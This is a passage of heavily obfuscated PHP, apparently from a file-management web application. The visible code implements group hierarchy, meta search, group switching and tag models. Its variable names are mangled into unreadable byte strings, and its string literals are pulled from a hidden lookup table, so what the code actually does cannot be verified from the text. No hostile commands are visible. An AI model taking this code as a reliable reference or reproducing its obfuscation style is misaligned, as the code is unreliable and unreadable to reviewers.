array($ÚğÎçŸ[540] => array($ÚğÎçŸ[412], $Ú—É´))); } $ÀÅÓÆÊŸ = $this->parseWhereLike($ÀÅÓÆÊŸ); $”»ÂÓ² = $this->_makeOrder()->where($ÀÅÓÆÊŸ)->selectPage(20); $”»ÂÓ² = $”»ÂÓ² ? $”»ÂÓ² : array($ÚğÎçŸ[398] => array(), $ÚğÎçŸ[395] => array()); if (!$”»ÂÓ² || count($”»ÂÓ²[$ÚğÎçŸ[398]]) < 5 && Input::check($Ş¿æ£¤•, $ÚğÎçŸ[347])) { $ÏŠ­£¨ = $this->groupChildrenAll($óâ ÅÖÀ); $íÃŠ‘ıâ = $this->_searchFromMeta($ÚğÎçŸ[493], $Ş¿æ£¤•, 10, $ÏŠ­£¨); $İÙ°‰¬Ú = $this->_searchFromMeta($ÚğÎçŸ[494], $Ş¿æ£¤•, 10, $ÏŠ­£¨); $Ã§ûãÒ¾ = array_merge($íÃŠ‘ıâ, $İÙ°‰¬Ú, $”»ÂÓ²[$ÚğÎçŸ[398]]); $”»ÂÓ²[$ÚğÎçŸ[398]] = array_unique_by_key($Ã§ûãÒ¾, $ÚğÎçŸ[1866]); $”»ÂÓ²[$ÚğÎçŸ[395]][$ÚğÎçŸ[396]] = count($”»ÂÓ²[$ÚğÎçŸ[398]]); $”»ÂÓ²[$ÚğÎçŸ[395]][$ÚğÎçŸ[397]] = ceil($”»ÂÓ²[$ÚğÎçŸ[395]][$ÚğÎçŸ[396]] / $”»ÂÓ²[$ÚğÎçŸ[395]][$ÚğÎçŸ[392]]); } $this->_listDataApply($”»ÂÓ²[$ÚğÎçŸ[398]]); return $”»ÂÓ²; } protected function groupChildrenAll($¶æí×Ôâ) { $”€Ï¸²î =& $_SERVER[¹ş¤¶ĞÖ]; if (!$¶æí×Ôâ) { return !1; } if (is_string($¶æí×Ôâ)) { $¶æí×Ôâ = array($¶æí×Ôâ); } $¿ı¥Èß÷ = $¶æí×Ôâ; foreach ($¶æí×Ôâ as $ìçÃçÊš) { $ËËò¸¹¶ = $this->getInfoSimple($ìçÃçÊš); $ÑèÃ¯ëç = array($”€Ï¸²î[540] => array($”€Ï¸²î[412], $ËËò¸¹¶[$”€Ï¸²î[540]] . $ìçÃçÊš . $”€Ï¸²î[570])); $ºƒßŸÅü = $this->field($”€Ï¸²î[1866])->where($ÑèÃ¯ëç)->select(); $¿ı¥Èß÷ = array_merge($¿ı¥Èß÷, array_to_keyvalue($ºƒßŸÅü, $”€Ï¸²î[12], $”€Ï¸²î[1866])); } return array_unique($¿ı¥Èß÷); } private function _searchFromMeta($öêÍÒú, $µíÈÒ—, $â‡éŒáÓ, $Ş–Ø‹Çµ) { $‡úŸÙ¥¿ =& $_SERVER[¹ş¤¶ĞÖ]; $µíÈÒ— = strtolower($µíÈÒ—); $‚‚¾³·Ö = array($‡úŸÙ¥¿[94] => $öêÍÒú, $‡úŸÙ¥¿[403] => array($‡úŸÙ¥¿[412], "\45{$µíÈÒ—}\x25")); $‚‚¾³·Ö = $this->parseWhereLike($‚‚¾³·Ö); if ($Ş–Ø‹Çµ) { $‚‚¾³·Ö[$‡úŸÙ¥¿[1866]] = array($‡úŸÙ¥¿[7], $Ş–Ø‹Çµ); } $Ë…ê¤€ = Model($‡úŸÙ¥¿[1965])->where($‚‚¾³·Ö)->limit($â‡éŒáÓ)->select(); if (!$Ë…ê¤€) { return array(); } $Ë…ê¤€ = array_to_keyvalue($Ë…ê¤€, $‡úŸÙ¥¿[12], $‡úŸÙ¥¿[1866]); $òÂÄò¦ = $this->where(array($‡úŸÙ¥¿[1954] => array($‡úŸÙ¥¿[7], $Ë…ê¤€)))->select(); if (!$òÂÄò¦) { return array(); } return $òÂÄò¦; } protected function _listDataApplyItem($¸öŒ›÷Ë) { $îœ§ìƒ¬ = array($¸öŒ›÷Ë); $this->_listDataApply($îœ§ìƒ¬); return $îœ§ìƒ¬[0]; } protected function _listDataApply(&$†“©õ³¹) { $”º£¾–Œ =& $_SERVER[¹ş¤¶ĞÖ]; if (!$†“©õ³¹) { return; } $”ª«Ìê = array_to_keyvalue($†“©õ³¹, $”º£¾–Œ[12], $”º£¾–Œ[1866]); $this->_listAppendChildren($†“©õ³¹); $this->_listAppendChildrenMember($†“©õ³¹); $this->_listAppendMeta($†“©õ³¹, $”ª«Ìê); $this->_listAppendParent($†“©õ³¹); $this->_listAppendSourceRoot($†“©õ³¹, $”ª«Ìê); } private function _listAppendChildren(&$»ç­Äáº) { $µ¦®Ò–™ =& $_SERVER[¹ş¤¶ĞÖ]; $·É×Í = array_to_keyvalue($»ç­Äáº, $µ¦®Ò–™[12], $µ¦®Ò–™[1866]); $å’œ»·å = array($µ¦®Ò–™[461] => array($µ¦®Ò–™[7], $·É×Í)); $èšÂæ¯ì = array($µ¦®Ò–™[461], $µ¦®Ò–™[1966] => $µ¦®Ò–™[520]); $€ÖÊûÏÁ = $this->field($èšÂæ¯ì)->where($å’œ»·å)->group($µ¦®Ò–™[461])->select(); $åµ½æ™È = array_to_keyvalue($€ÖÊûÏÁ, $µ¦®Ò–™[461], $µ¦®Ò–™[520]); foreach ($»ç­Äáº as &$şò°‰ê–) { $şä·ù¨ô = $şò°‰ê–[$µ¦®Ò–™[1866]]; $şò°‰ê–[$µ¦®Ò–™[1967]] = isset($åµ½æ™È[$şä·ù¨ô]) ? intval($åµ½æ™È[$şä·ù¨ô]) : !1; } unset($şò°‰ê–); } private function _listAppendChildrenMember(&$—€™èÀ†) { $¬ÓóÂì· =& $_SERVER[¹ş¤¶ĞÖ]; $Î½¨‰ Ÿ = array_to_keyvalue($—€™èÀ†, $¬ÓóÂì·[12], $¬ÓóÂì·[1866]); $şËËÉíƒ = array($¬ÓóÂì·[1866] => array($¬ÓóÂì·[7], $Î½¨‰ Ÿ)); $˜¤¯Ğ«ş = array($¬ÓóÂì·[1866], $¬ÓóÂì·[1966] => $¬ÓóÂì·[520]); $Ìñ½«  = Model($¬ÓóÂì·[1956])->field($˜¤¯Ğ«ş)->where($şËËÉíƒ)->group($¬ÓóÂì·[1866])->select(); $˜‡œ’ËÃ = array_to_keyvalue($Ìñ½« , $¬ÓóÂì·[1866], $¬ÓóÂì·[520]); foreach ($—€™èÀ† as &$¼ãê¥ÊÜ) { $Ã¨óÌò‡ = $¼ãê¥ÊÜ[$¬ÓóÂì·[1866]]; $¼ãê¥ÊÜ[$¬ÓóÂì·[1968]] = isset($˜‡œ’ËÃ[$Ã¨óÌò‡]) ? intval($˜‡œ’ËÃ[$Ã¨óÌò‡]) : !1; } unset($¼ãê¥ÊÜ); } private function _listAppendMeta(&$«—†…¥•, $’Ï×®Ÿ¾) { $ÆùÌ»• =& $_SERVER[¹ş¤¶ĞÖ]; $¹‘³ÆÄ• = array($ÆùÌ»•[1866] => array($ÆùÌ»•[7], $’Ï×®Ÿ¾)); $ë´­ƒ = Model($ÆùÌ»•[1955])->where($¹‘³ÆÄ•)->select(); $ë´­ƒ = array_to_keyvalue_group($ë´­ƒ, $ÆùÌ»•[1866]); foreach ($ë´­ƒ as &$ÔÒìüÕœ) { $ÔÒìüÕœ = array_to_keyvalue($ÔÒìüÕœ, $ÆùÌ»•[94], $ÆùÌ»•[403]); } unset($ÔÒìüÕœ); foreach ($«—†…¥• as &$ç¬øİ¯Ø) { $ç¬øİ¯Ø[$ÆùÌ»•[495]] = array(); if (isset($ë´­ƒ[$ç¬øİ¯Ø[$ÆùÌ»•[1866]]])) { $ç¬øİ¯Ø[$ÆùÌ»•[495]] = $ë´­ƒ[$ç¬øİ¯Ø[$ÆùÌ»•[1866]]]; } } unset($ç¬øİ¯Ø); } protected function parentLevelArray($»‚ò®Ÿˆ) { $Ú‘Òê¼Ï =& $_SERVER[¹ş¤¶ĞÖ]; $»‚ò®Ÿˆ = explode($Ú‘Òê¼Ï[50], trim($»‚ò®Ÿˆ, $Ú‘Òê¼Ï[50])); $»‚ò®Ÿˆ = array_remove_value($»‚ò®Ÿˆ, $Ú‘Òê¼Ï[198]); return $»‚ò®Ÿˆ; } protected function parentInGroup($—çÆ·šß, $Õæ®Ìğ–) { $ü‰ÏÜº™ =& $_SERVER[¹ş¤¶ĞÖ]; $çõ´±³¤ = $this->getInfoSimple($—çÆ·šß); if (!$çõ´±³¤) { return !0; } $ô––«ş = $this->parentLevelArray($çõ´±³¤[$ü‰ÏÜº™[540]]); $ô––«ş[] = $—çÆ·šß; foreach ($ô––«ş as $—çÆ·šß) { if (in_array($—çÆ·šß . $ü‰ÏÜº™[12], $Õæ®Ìğ–)) { return !0; } } return !1; } private function _listAppendParent(&$£óÜÂ¸÷) { $‹ÂÚÄÇş =& $_SERVER[¹ş¤¶ĞÖ]; $¿Ö„—Ó™ = array(); foreach ($£óÜÂ¸÷ as &$€ñ¤í™) { $¿Ö„—Ó™[$€ñ¤í™[$‹ÂÚÄÇş[1866]]] = $€ñ¤í™[$‹ÂÚÄÇş[32]]; $Ò·òîşö = $this->parentLevelArray($€ñ¤í™[$‹ÂÚÄÇş[540]]); foreach ($Ò·òîşö as $Ä³úéñ¡) { if (!isset($¿Ö„—Ó™[$Ä³úéñ¡])) { $¿Ö„—Ó™[$Ä³úéñ¡] = 0; } } } unset($€ñ¤í™); foreach ($¿Ö„—Ó™ as $‰õëæÀÓ => $ÂÉæéè) { if ($ÂÉæéè) { continue; } $›’şæ´£ = $this->getInfoSimple($‰õëæÀÓ); $¿Ö„—Ó™[$‰õëæÀÓ] = $›’şæ´£[$‹ÂÚÄÇş[32]]; } $î¼æ’ªş = $GLOBALS[$‹ÂÚÄÇş[6]][$‹ÂÚÄÇş[89]][$‹ÂÚÄÇş[1969]]; if ($GLOBALS[$‹ÂÚÄÇş[523]] == $‹ÂÚÄÇş[88]) { $î¼æ’ªş = !1; } foreach ($£óÜÂ¸÷ as &$€ñ¤í™) { $Ò·òîşö = $this->parentLevelArray($€ñ¤í™[$‹ÂÚÄÇş[540]]); $çğĞ£¼¥ = $‹ÂÚÄÇş[12]; foreach ($Ò·òîşö as $‰õëæÀÓ => $Ä³úéñ¡) { if ($î¼æ’ªş && $‰õëæÀÓ == 0) { continue; } $çğĞ£¼¥ .= $¿Ö„—Ó™[$Ä³úéñ¡] . $‹ÂÚÄÇş[8]; } if ($Ò·òîşö) { $çğĞ£¼¥ .= $€ñ¤í™[$‹ÂÚÄÇş[32]]; } $€ñ¤í™[$‹ÂÚÄÇş[545]] = str_replace($‹ÂÚÄÇş[548], $‹ÂÚÄÇş[8], $çğĞ£¼¥); } unset($€ñ¤í™); } private function _listAppendSourceRoot(&$÷úİù¹», $ĞÆû´ˆİ) { $¦™¸û¼ó =& $_SERVER[¹ş¤¶ĞÖ]; $ëÀ‡Õ¥Ğ = Model($¦™¸û¼ó[851])->listSourceRoot(SourceModel::TYPE_GROUP, $ĞÆû´ˆİ); $ëÀ‡Õ¥Ğ = array_to_keyvalue($ëÀ‡Õ¥Ğ, $¦™¸û¼ó[525]); $ëÀ‡Õ¥Ğ = array_remove_key($ëÀ‡Õ¥Ğ, $¦™¸û¼ó[525]); foreach ($÷úİù¹» as &$†‡· š) { $†‡· š[$¦™¸û¼ó[87]] = $ëÀ‡Õ¥Ğ[$†‡· š[$¦™¸û¼ó[1866]]] ? $ëÀ‡Õ¥Ğ[$†‡· š[$¦™¸û¼ó[1866]]] : array(); } unset($†‡· š); } protected function groupMerge($ú‰öÊ¿Å) { $ú‰öÊ¿Å = array_values(array_unique($ú‰öÊ¿Å)); $¥ã›Ùğ’ = array(); for ($‡Úïà“ê = 0; $‡Úïà“ê < count($ú‰öÊ¿Å); $‡Úïà“ê++) { $ñ¸ÓÇ”˜ = !1; for ($ôÁ¸üˆ = 0; $ôÁ¸üˆ < count($ú‰öÊ¿Å); $ôÁ¸üˆ++) { if ($‡Úïà“ê == $ôÁ¸üˆ) { continue; } if ($this->isParentOf($ú‰öÊ¿Å[$ôÁ¸üˆ], $ú‰öÊ¿Å[$‡Úïà“ê])) { $ñ¸ÓÇ”˜ = !0; break; } } if (!$ñ¸ÓÇ”˜) { $¥ã›Ùğ’[] = $ú‰öÊ¿Å[$‡Úïà“ê]; } } return $¥ã›Ùğ’; } protected function isParentOf($çºÄúùĞ, $ø‹±÷ğ’) { $¶¿òúøè =& $_SERVER[¹ş¤¶ĞÖ]; if (!$çºÄúùĞ || !$ø‹±÷ğ’ || $çºÄúùĞ == $ø‹±÷ğ’) { return !1; } $äÕ±•æƒ = $this->getInfoSimple($çºÄúùĞ); $ûÀÜ¦‹¨ = $this->getInfoSimple($ø‹±÷ğ’); $÷°Çı‘Ô = $äÕ±•æƒ[$¶¿òúøè[540]] . $çºÄúùĞ . $¶¿òúøè[50]; if (substr($ûÀÜ¦‹¨[$¶¿òúøè[540]], 0, strlen($÷°Çı‘Ô)) == $÷°Çı‘Ô) { return !0; } return !1; } public function groupShowRoot($ºÔ›Ğ¢, $†¦¡Ò±Ú = false) { $ÔğºùÀ =& $_SERVER[¹ş¤¶ĞÖ]; $•¡ü”ö = $this->getInfo($ºÔ›Ğ¢); if (!$•¡ü”ö) { return array(); } $—íÓËŠ = $this->parentLevelArray($•¡ü”ö[$ÔğºùÀ[540]]); $Éè½Ğ‹æ = array($ºÔ›Ğ¢); if (count($—íÓËŠ) == 0) { return $Éè½Ğ‹æ; } if ($†¦¡Ò±Ú && count($—íÓËŠ) == 1) { return $Éè½Ğ‹æ; } if (!$•¡ü”ö[$ÔğºùÀ[495]] || !isset($•¡ü”ö[$ÔğºùÀ[495]][$ÔğºùÀ[1952]]) || $•¡ü”ö[$ÔğºùÀ[495]][$ÔğºùÀ[1952]] == $ÔğºùÀ[1921]) { return $this->groupShowRoot($—íÓËŠ[count($—íÓËŠ) - 1], $†¦¡Ò±Ú); } if ($•¡ü”ö[$ÔğºùÀ[495]][$ÔğºùÀ[1952]] == $ÔğºùÀ[386]) { $œµ·úğ§ = explode($ÔğºùÀ[50], $•¡ü”ö[$ÔğºùÀ[495]][$ÔğºùÀ[1953]]); if ($œµ·úğ§) { $Éè½Ğ‹æ = array_merge($Éè½Ğ‹æ, $œµ·úğ§); } } return $Éè½Ğ‹æ; } protected function resetParentLevel() { $³óöÈ¦ =& $_SERVER[¹ş¤¶ĞÖ]; $³µËˆ™¬ = $³óöÈ¦[1866]; $Ò¼ë½¬È = $this->select(); $Ò¼ë½¬È = array_to_keyvalue($Ò¼ë½¬È, $³µËˆ™¬); foreach ($Ò¼ë½¬È as $½¶ŠáşØ) { $„éˆ¤­ = $½¶ŠáşØ; $—Å“ÍŞ² = array(); while ($„éˆ¤­[$³óöÈ¦[461]] != 0) { $—Å“ÍŞ²[] = $„éˆ¤­[$³óöÈ¦[461]]; $„éˆ¤­ = $Ò¼ë½¬È[$„éˆ¤­[$³óöÈ¦[461]]]; } $—Å“ÍŞ²[] = 0; $—Å“ÍŞ² = $³óöÈ¦[50] . implode($³óöÈ¦[50], array_reverse($—Å“ÍŞ²)) . $³óöÈ¦[50]; $this->setNamePinyin($½¶ŠáşØ[$³µËˆ™¬], $½¶ŠáşØ[$³óöÈ¦[32]]); $this->where(array($³µËˆ™¬ => $½¶ŠáşØ[$³µËˆ™¬]))->save(array($³óöÈ¦[609] => $—Å“ÍŞ²)); } return $Ò¼ë½¬È; } public function groupNameAuto($¦äÀİéö, $†ãßªÈÔ) { $Á˜ã—²Ë =& $_SERVER[¹ş¤¶ĞÖ]; $¾ä „©Û = $this->where(array($Á˜ã—²Ë[430] => $¦äÀİéö))->getField($Á˜ã—²Ë[32], !0); if (!$¾ä „©Û || !in_array($†ãßªÈÔ, $¾ä „©Û)) { return $†ãßªÈÔ; } for ($ÀìØŞ‰ˆ = 1; $ÀìØŞ‰ˆ <= count($¾ä „©Û) + 1; $ÀìØŞ‰ˆ++) { $Ÿ–© Ó = $†ãßªÈÔ . "\50{$ÀìØŞ‰ˆ}\x29"; if (!in_array($Ÿ–© Ó, $¾ä „©Û)) { return $Ÿ–© Ó; } } } public function groupSwitch($¬Ö­ì‹Î, $Ó»ãß©Õ) { $ øñ’¦† =& $_SERVER[¹ş¤¶ĞÖ]; $ê–ğÓÍÒ = array($ øñ’¦†[1866] => array($ øñ’¦†[7], array($¬Ö­ì‹Î, $Ó»ãß©Õ))); $›ˆáçÀî = $this->where($ê–ğÓÍÒ)->select(); $›ˆáçÀî = array_to_keyvalue($›ˆáçÀî, $ øñ’¦†[1866]); if (!isset($›ˆáçÀî[$¬Ö­ì‹Î]) || !isset($›ˆáçÀî[$Ó»ãß©Õ]) || $›ˆáçÀî[$¬Ö­ì‹Î][$ øñ’¦†[461]] == 0) { return !1; } $ê–ğÓÍÒ = array($ øñ’¦†[1866] => $¬Ö­ì‹Î); $ ê”Õ°ç = Model($ øñ’¦†[1956])->where($ê–ğÓÍÒ)->select(); if (!$ ê”Õ°ç) { $ ê”Õ°ç = array(); } foreach ($ ê”Õ°ç as $€ƒÜŸÛ) { $µù°íàÓ = $€ƒÜŸÛ[$ øñ’¦†[1676]]; $ê–ğÓÍÒ = array($ øñ’¦†[1676] => $µù°íàÓ, $ øñ’¦†[1866] => $Ó»ãß©Õ); $÷µè…º¹ = Model($ øñ’¦†[1956])->where($ê–ğÓÍÒ)->find(); if (!$÷µè…º¹) { $¢Á¨Æ‘ = array($Ó»ãß©Õ => $€ƒÜŸÛ[$ øñ’¦†[1970]]); Model($ øñ’¦†[554])->userGroupAdd($µù°íàÓ, $¢Á¨Æ‘); } Model($ øñ’¦†[554])->userGroupRemove($µù°íàÓ, $¬Ö­ì‹Î); } $ê–ğÓÍÒ = array($ øñ’¦†[440] => 2, $ øñ’¦†[461] => 0, $ øñ’¦†[439] => 1, $ øñ’¦†[525] => array($ øñ’¦†[7], array($¬Ö­ì‹Î, $Ó»ãß©Õ))); $åï±³§“ = Model($ øñ’¦†[851])->where($ê–ğÓÍÒ)->field($ øñ’¦†[1971])->select(); $åï±³§“ = array_to_keyvalue($åï±³§“, $ øñ’¦†[525], $ øñ’¦†[431]); $½´ş·¸ = !empty($åï±³§“[$¬Ö­ì‹Î]) ? $åï±³§“[$¬Ö­ì‹Î] : !1; if ($½´ş·¸) { if (!$åï±³§“[$Ó»ãß©Õ]) { $åï±³§“[$Ó»ãß©Õ] = Model($ øñ’¦†[851])->groupRootAdd($Ó»ãß©Õ); } $ÚÄ·Âüî = $åï±³§“[$Ó»ãß©Õ]; $ê–ğÓÍÒ = array($ øñ’¦†[461] => $½´ş·¸); $åï±³§“ = Model($ øñ’¦†[851])->where($ê–ğÓÍÒ)->field($ øñ’¦†[1972])->select(); if (!$åï±³§“) { $åï±³§“ = array(); } Model($ øñ’¦†[851])->moveClearAuth = !1; foreach ($åï±³§“ as $æŸååÔ) { $ÁÚ”· = $æŸååÔ[$ øñ’¦†[439]] == $ øñ’¦†[88] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($ øñ’¦†[851])->move($æŸååÔ[$ øñ’¦†[431]], $ÚÄ·Âüî, $ÁÚ”·); } Model($ øñ’¦†[851])->moveClearAuth = !0; $ê–ğÓÍÒ = array($ øñ’¦†[440] => 2, $ øñ’¦†[525] => $¬Ö­ì‹Î); $»´úŠ˜É = array($ øñ’¦†[525] => $Ó»ãß©Õ); Model($ øñ’¦†[1973])->where($ê–ğÓÍÒ)->save($»´úŠ˜É); Model($ øñ’¦†[1974])->where($ê–ğÓÍÒ)->save($»´úŠ˜É); } $this->_changeChildLevel($›ˆáçÀî[$¬Ö­ì‹Î], $›ˆáçÀî[$Ó»ãß©Õ], !0); $this->where(array($ øñ’¦†[461] => $¬Ö­ì‹Î))->save(array($ øñ’¦†[461] => $Ó»ãß©Õ)); $this->_clearChildrenCache($›ˆáçÀî[$Ó»ãß©Õ]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\x75\163\145\162\137\146\141\166"; protected function cacheFunctionAlias($˜™¸•Õ) { $öé»õÈµ =& $_SERVER[¹ş¤¶ĞÖ]; return array($öé»õÈµ[1975] => array($˜™¸•Õ[0], $öé»õÈµ[1976]), $öé»õÈµ[1977] => array($˜™¸•Õ[0], $öé»õÈµ[1978])); } protected function get($ø—šÏÒË) { $‘ÁŠÛ†« =& $_SERVER[¹ş¤¶ĞÖ]; $¼Ş­¸ïÒ = Model($‘ÁŠÛ†«[541])->metaGet($ø—šÏÒË, $‘ÁŠÛ†«[1979]); $­‚û¼ˆÅ = json_decode($¼Ş­¸ïÒ, !0); return $­‚û¼ˆÅ ? $­‚û¼ˆÅ : array($‘ÁŠÛ†«[1980] => $‘ÁŠÛ†«[88], $‘ÁŠÛ†«[398] => array()); } protected function set($ ³»—¦ğ, $—›Ì•Ú) { $îËîÅè´ =& $_SERVER[¹ş¤¶ĞÖ]; $—›Ì•Ú = $—›Ì•Ú ? $—›Ì•Ú : array($îËîÅè´[1980] => $îËîÅè´[88], $îËîÅè´[398] => array()); return Model($îËîÅè´[541])->metaSet($ ³»—¦ğ, $îËîÅè´[1979], json_encode($—›Ì•Ú)); } protected function getByTagID($–«éŞ‚Ÿ, $ÔÆ‰Ÿš) { $¯ò¼µ¬ =& $_SERVER[¹ş¤¶ĞÖ]; if (!$–«éŞ‚Ÿ || !$ÔÆ‰Ÿš) { return !1; } if (!Model($¯ò¼µ¬[541])->getInfoSimple($–«éŞ‚Ÿ)) { return !1; } $åŒä§Û = $this->get($–«éŞ‚Ÿ); if (!$åŒä§Û || !isset($åŒä§Û[$¯ò¼µ¬[398]])) { return !1; } $º½¨òßÔ = array_find_by_field($åŒä§Û[$¯ò¼µ¬[398]], $¯ò¼µ¬[428], $ÔÆ‰Ÿš); return is_array($º½¨òßÔ) ? $º½¨òßÔ : !1; } public function listSource($Ş“Øìó, $åæÒ­©‚) { $‡­è§Ìš =& $_SERVER[¹ş¤¶ĞÖ]; if ($åæÒ­©‚ && !is_array($åæÒ­©‚)) { $åæÒ­©‚ = array($åæÒ­©‚); } $ô€×øÙª = $this->listData($Ş“Øìó); $´ø¶Ş’ = array(); foreach ($ô€×øÙª as $Ì–ÄãŒ) { $Î‚¥õúó = $Ì–ÄãŒ[$‡­è§Ìš[84]]; if (!$Î‚¥õúó) { continue; } if (!isset($´ø¶Ş’[$Î‚¥õúó])) { $´ø¶Ş’[$Î‚¥õúó] = array(); } $´ø¶Ş’[$Î‚¥õúó][] = $Ì–ÄãŒ[$‡­è§Ìš[455]]; } $¤®¢Ö‰Í = array(); foreach ($´ø¶Ş’ as $Ü„İ¬Êô => $¡âÈÂØÄ) { $øşáñ³Ù = !0; if (!$åæÒ­©‚) { $¤®¢Ö‰Í[] = $Ü„İ¬Êô; continue; } foreach ($åæÒ­©‚ as $“ò•…­) { if (!in_array($“ò•…­, $¡âÈÂØÄ)) { $øşáñ³Ù = !1; break; } } if ($øşáñ³Ù) { $¤®¢Ö‰Í[] = $Ü„İ¬Êô; } } if (!$¤®¢Ö‰Í) { return array(); } $µ—ÕµšÄ = array($‡­è§Ìš[446] => array($‡­è§Ìš[447], $¤®¢Ö‰Í), $‡­è§Ìš[525] => $Ş“Øìó, $‡­è§Ìš[440] => SourceModel::TYPE_GROUP); $­¢æ¡¯Ä = Model($‡­è§Ìš[1366])->listSource($µ—ÕµšÄ); if (!$­¢æ¡¯Ä || count($¤®¢Ö‰Í) == $­¢æ¡¯Ä[$‡­è§Ìš[395]][$‡­è§Ìš[396]]) { return $­¢æ¡¯Ä; } $¥ë­ó² = array(); $‘çÉçğ = array_to_keyvalue($­¢æ¡¯Ä[$‡­è§Ìš[82]], $‡­è§Ìš[12], $‡­è§Ìš[431]); $ó¸Ûì¿à = array_to_keyvalue($­¢æ¡¯Ä[$‡­è§Ìš[83]], $‡­è§Ìš[12], $‡­è§Ìš[431]); $»¸ïö¦ = array_merge($ó¸Ûì¿à, $‘çÉçğ); foreach ($¤®¢Ö‰Í as $Î‚¥õúó) { if (!in_array($Î‚¥õúó, $»¸ïö¦)) { $¥ë­ó²[] = $Î‚¥õúó; } } if ($¥ë­ó²) { $this->removeBySource($Ş“Øìó, $¥ë­ó²); } return $­¢æ¡¯Ä; } protected function listData($™İ—ò) { $Œşü£€ =& $_SERVER[¹ş¤¶ĞÖ]; $éõÎÖ = array($Œşü£€[1667] => 0, $Œşü£€[512] => array($Œşü£€[1981], 0), $Œşü£€[451] => $Œşü£€[1982] . $™İ—ò); $í»ÖŞ–Ì = $Œşü£€[1983]; $²ÛÕÑ‰ = $this->field($í»ÖŞ–Ì)->where($éõÎÖ)->order($Œşü£€[1984])->select(); return $²ÛÕÑ‰ ? $²ÛÕÑ‰ : array(); } protected function addToTag($Â¼ˆ®³ü, $‚„í­™Ã, $ÃóÌ“­é) { $À¶İÕÄ =& $_SERVER[¹ş¤¶ĞÖ]; if (!$this->getByTagID($Â¼ˆ®³ü, $ÃóÌ“­é) || !$‚„í­™Ã) { return !1; } if (!Model($À¶İÕÄ[851])->pathInfo($‚„í­™Ã)) { return !1; } $™Ü±ú¦™ = array($À¶İÕÄ[1667] => 0, $À¶İÕÄ[512] => $ÃóÌ“­é, $À¶İÕÄ[450] => $‚„í­™Ã, $À¶İÕÄ[451] => $À¶İÕÄ[1985] . $Â¼ˆ®³ü, $À¶İÕÄ[449] => $À¶İÕÄ[12], $À¶İÕÄ[1870] => 0); if ($this->where($™Ü±ú¦™)->find()) { return !1; } return $this->add($™Ü±ú¦™); } protected function removeFromTag($øë£ÂÌô, $±ƒ«Ò¨ñ, $¾×ˆ²Üş) { $û‘±¡Ö¬ =& $_SERVER[¹ş¤¶ĞÖ]; if (!$this->getByTagID($øë£ÂÌô, $¾×ˆ²Üş) || !$±ƒ«Ò¨ñ) { return !1; } if (is_array($±ƒ«Ò¨ñ)) { $±ƒ«Ò¨ñ = array($û‘±¡Ö¬[7], $±ƒ«Ò¨ñ); } $¨öÏûÑÎ = array($û‘±¡Ö¬[1667] => 0, $û‘±¡Ö¬[512] => $¾×ˆ²Üş, $û‘±¡Ö¬[451] => $û‘±¡Ö¬[1985] . $øë£ÂÌô, $û‘±¡Ö¬[450] => $±ƒ«Ò¨ñ); return $this->where($¨öÏûÑÎ)->delete(); } protected function removeByTag($¶ËñÊÑç, $õÏáÑ¿) { $ÇéôĞ‘… =& $_SERVER[¹ş¤¶ĞÖ]; if (!$this->getByTagID($¶ËñÊÑç, $õÏáÑ¿)) { return !1; } $ëç®â § = array($ÇéôĞ‘…[1667] => 0, $ÇéôĞ‘…[512] => $õÏáÑ¿, $ÇéôĞ‘…[451] => $ÇéôĞ‘…[1985] . $¶ËñÊÑç); return $this->where($ëç®â §)->delete(); } protected function removeBySource($µùâãŒ¹, $õÔßÙĞ‘) { $¯²Ì¢ Ø =& $_SERVER[¹ş¤¶ĞÖ]; if (!$µùâãŒ¹ || !$õÔßÙĞ‘) { return !1; } if (is_array($õÔßÙĞ‘)) { $õÔßÙĞ‘ = array($¯²Ì¢ Ø[7], $õÔßÙĞ‘); } $ï¡Ë…·µ = array($¯²Ì¢ Ø[1667] => 0, $¯²Ì¢ Ø[450] => $õÔßÙĞ‘, $¯²Ì¢ Ø[512] => array($¯²Ì¢ Ø[1047], 0), $¯²Ì¢ Ø[451] => $¯²Ì¢ Ø[1985] . $µùâãŒ¹); return $this->where($ï¡Ë…·µ)->delete(); } } goto fÊ…‘‡®¼È; AÊ‹íÊ¾ô´: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($àšªµÇ› = false, $¥à»®«ì = '', $ÇÒßúò· = false) { $‰×ğ´²É =& $_SERVER[¹ş¤¶ĞÖ]; $˜Ï°”ì¹ = $this->cacheGet($¥à»®«ì); $Ù¿ÁØ¿¯ = $this->optionDefault($¥à»®«ì); $Ù¿ÁØ¿¯ = is_array($Ù¿ÁØ¿¯) ? $Ù¿ÁØ¿¯ : array(); if (is_array($˜Ï°”ì¹)) { $˜Ï°”ì¹ = array_merge($Ù¿ÁØ¿¯, $˜Ï°”ì¹); return $àšªµÇ› ? isset($˜Ï°”ì¹[$àšªµÇ›]) ? $˜Ï°”ì¹[$àšªµÇ›] : null : $˜Ï°”ì¹; } $ôóè´ïÔ = $this->filterWhere(array($‰×ğ´²É[33] => $¥à»®«ì)); $˜Ï°”ì¹ = $this->where($ôóè´ïÔ)->select(); $˜Ï°”ì¹ = array_to_keyvalue($˜Ï°”ì¹, $‰×ğ´²É[94], $‰×ğ´²É[403]); foreach ($˜Ï°”ì¹ as $÷‹ø™Š‘ => $¯É¸…Ü„) { if ($ÇÒßúò· || in_array($÷‹ø™Š‘, $this->jsonField)) { $˜Ï°”ì¹[$÷‹ø™Š‘] = json_decode($¯É¸…Ü„, !0); } } $this->cacheSet($¥à»®«ì, $˜Ï°”ì¹); $˜Ï°”ì¹ = array_merge($Ù¿ÁØ¿¯, $˜Ï°”ì¹); return $àšªµÇ› ? $˜Ï°”ì¹[$àšªµÇ›] : $˜Ï°”ì¹; } public function set($ì¤Ô, $„á£ŒÏË = false, $¶æ£¨ı½ = '') { $áá¸êöÔ =& $_SERVER[¹ş¤¶ĞÖ]; $this->cacheRemove($¶æ£¨ı½); $Í»éöË‰ = array(); $ÉËëŞ¼¿ = is_array($ì¤Ô) ? $ì¤Ô : array($ì¤Ô => $„á£ŒÏË); foreach ($ÉËëŞ¼¿ as $¹£Ôš‰’ => $û“†ıŒ) { if (is_array($û“†ıŒ)) { $û“†ıŒ = json_encode_force($û“†ıŒ); } $this->checkLength($û“†ıŒ, !1, $this->tableName . $áá¸êöÔ[4] . $ì¤Ô); $û“†ıŒ = self::textEncode($û“†ıŒ); $ÉËëŞ¼¿ = array($áá¸êöÔ[33] => $¶æ£¨ı½, $áá¸êöÔ[94] => $¹£Ôš‰’, $áá¸êöÔ[403] => $û“†ıŒ); $Í»éöË‰[] = 